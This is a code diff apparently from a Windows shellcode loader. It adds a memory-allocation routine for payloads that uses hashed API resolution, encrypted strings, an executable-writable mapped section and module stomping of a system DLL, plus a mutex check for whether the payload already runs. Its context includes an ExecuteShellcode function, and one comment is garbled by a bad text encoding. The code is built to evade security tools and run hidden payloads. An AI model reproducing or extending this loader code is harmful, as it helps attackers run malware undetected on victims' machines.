@@ -9,7 +9,7 @@
 #include <powrprof.h>
 #include <imm.h>
 #include <setupapi.h>
-#include<avrfsdk.h>
+#include <avrfsdk.h>
 
 #pragma comment(lib, "Setupapi.lib")
 #pragma comment(lib, "Imm32.lib")
@@ -353,4 +353,69 @@ BOOLEAN ExecuteShellcode(PExecuteShellcodeStruct execStruct) {
 		break;
 	}
 	return TRUE;
+}
+
+NTSTATUS AllocateMem(LPVOID* lpMem, PSIZE_T size) {
+	NTSTATUS status = 0xC0000001;
+
+	switch (allocateMethod) {
+	case CASE_NtAllocateVirtualMemory: {
+
+		status = dynamicInvoker.Invoke<NTSTATUS>(NtAllocateVirtualMemoryStruct.funcAddr, NtAllocateVirtualMemoryStruct.funcHash,
+			(HANDLE)-1, lpMem, 0, size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+
+		break;
+	}case CASE_NtMapOfView: {
+		HANDLE hSection = NULL;
+		SIZE_T secSize = *size;
+		LARGE_INTEGER sectionSize = { secSize };
+		pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddressbyHASH(GetMoudlebyName(_wcsdup(ENCRYPT_WSTR("ntdll.dll"))), NtCreateSection_Hashed);
+
+		status = NtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+
+		if (NT_SUCCESS(status)) {
+			SIZE_T viewSize = *size;
+			LPVOID mem = NULL;
+
+			pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddressbyHASH(GetMoudlebyName(_wcsdup(ENCRYPT_WSTR("ntdll.dll"))), NtMapViewOfSection_Hashed);
+			status = NtMapViewOfSection(hSection, (HANDLE)-1, lpMem, NULL, NULL, 0, &viewSize, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE);
+
+		}
+		break;
+	}case CASE_ModuleStomping: {
+		HMODULE hModule = myLoadLibrary(ENCRYPT_WSTR("AppVIntegration.dll"));
+
+		if (!hModule) return status;
+		PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
+		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
+		PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
+
+		// ≤È’“.data∂Œ
+		for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
+			if (memcmp(section[i].Name, ENCRYPT_STR(".data"), 5) == 0) {
+				DWORD oldProtect;
+				*lpMem = (LPVOID)((BYTE*)hModule + section[i].VirtualAddress);
+				*size = section[i].Misc.VirtualSize;
+
+				status = dynamicInvoker.Invoke<NTSTATUS>(NtProtectVirtualMemoryStruct.funcAddr,
+					NtProtectVirtualMemoryStruct.funcHash,
+					(HANDLE)-1, lpMem, size, PAGE_READWRITE, &oldProtect);
+				break;
+			}
+		}
+		break;
+	}
+	default:
+		break;
+	}
+	return status;
+}
+
+BOOLEAN isPayloadRunning() {
+	// NtCreateMutant
+	HANDLE hSync = CreateMutex(NULL, TRUE, L"Global\\Sync");
+	if(GetLastError() == ERROR_ALREADY_EXISTS) {
+		return TRUE;
+	}
+	return FALSE;
 }
